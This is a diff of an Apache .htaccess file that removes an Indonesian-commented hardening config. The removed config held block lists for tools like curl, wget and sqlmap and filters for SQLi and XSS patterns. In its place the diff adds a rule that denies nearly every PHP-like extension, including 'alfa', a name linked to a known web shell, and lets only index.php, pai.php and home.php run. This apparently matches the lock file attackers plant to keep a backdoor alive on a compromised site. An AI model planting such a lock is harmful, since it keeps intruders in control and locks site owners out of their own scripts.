@@ -1,65 +1,10 @@
-# ===============================
-# 1️⃣ AKTIFKAN MOD_REWRITE
-# ===============================
-RewriteEngine On
-RewriteBase /
-
-# ===============================
-# 2️⃣ BLOKIR FILE BERBAHAYA ATAU TIDAK DIPERLUKAN
-# ===============================
-<FilesMatch "\.(php|phtml|php[0-9]?|html?|htmls|txt|bak|inc|conf|log|ini|sql|zip|rar)$">
-    Require all denied
+<FilesMatch ".(php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PhP7|alfa|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|alfa|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|suspected)$">
+Order allow,deny
+deny from all
 </FilesMatch>
 
-# Untuk Apache lama (2.2)
-<IfModule !mod_authz_core.c>
-    <FilesMatch "\.(php|phtml|php[0-9]?|html?|htmls|txt|bak|inc|conf|log|ini|sql|zip|rar)$">
-        Order allow,deny
-        Deny from all
-    </FilesMatch>
-</IfModule>
-
-# ===============================
-# 3️⃣ BLOKIR AKSES DARI LUAR DOMAIN (ANTI HOTLINK & REFERRER)
-# ===============================
-# Ganti domainmu.com dengan domain kamu sendiri!
-RewriteCond %{HTTP_REFERER} !^$
-RewriteCond %{HTTP_REFERER} !^https?://(www\.)?domainmu\.com [NC]
-RewriteRule \.(php|html?|htmls|jpg|png|gif|webp|css|js)$ - [F,L]
-
-# ===============================
-# 4️⃣ BLOKIR BOT / USER AGENT MENCURIGAKAN
-# ===============================
-SetEnvIfNoCase User-Agent "curl" bad_bot
-SetEnvIfNoCase User-Agent "wget" bad_bot
-SetEnvIfNoCase User-Agent "python" bad_bot
-SetEnvIfNoCase User-Agent "nikto" bad_bot
-SetEnvIfNoCase User-Agent "fuzz" bad_bot
-SetEnvIfNoCase User-Agent "sqlmap" bad_bot
-SetEnvIfNoCase User-Agent "nmap" bad_bot
-<RequireAll>
-    Require all granted
-    Require not env bad_bot
-</RequireAll>
-
-# ===============================
-# 5️⃣ BLOKIR REQUEST BERBAHAYA (SQLi, XSS, DLL)
-# ===============================
-RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
-RewriteCond %{QUERY_STRING} (\*|;|'|"|union|select|insert|drop|update|eval|alert|base64) [NC]
-RewriteRule ^ - [F,L]
-
-# ===============================
-# 6️⃣ NONAKTIFKAN EXECUTE DI FOLDER INI (AMANKAN)
-# ===============================
-Options -Indexes
-Options -ExecCGI
-Options -Includes
-RemoveHandler .php .phtml .php[0-9] .pl .py .jsp .asp .sh .cgi
-
-# ===============================
-# 7️⃣ BLOKIR SEMUA KECUALI DOMAIN SENDIRI
-# ===============================
-# (opsional – jika kamu ingin situs ini hanya bisa diakses dari domainmu)
-# RewriteCond %{HTTP_HOST} !^((www\.)?domainmu\.com)$ [NC]
-# RewriteRule ^ - [F,L]
+# php yang di kecualikan.....
+<FilesMatch "^(index.php|pai.php|home.php)$">
+    Order Allow,Deny
+    Allow from all
+</FilesMatch>
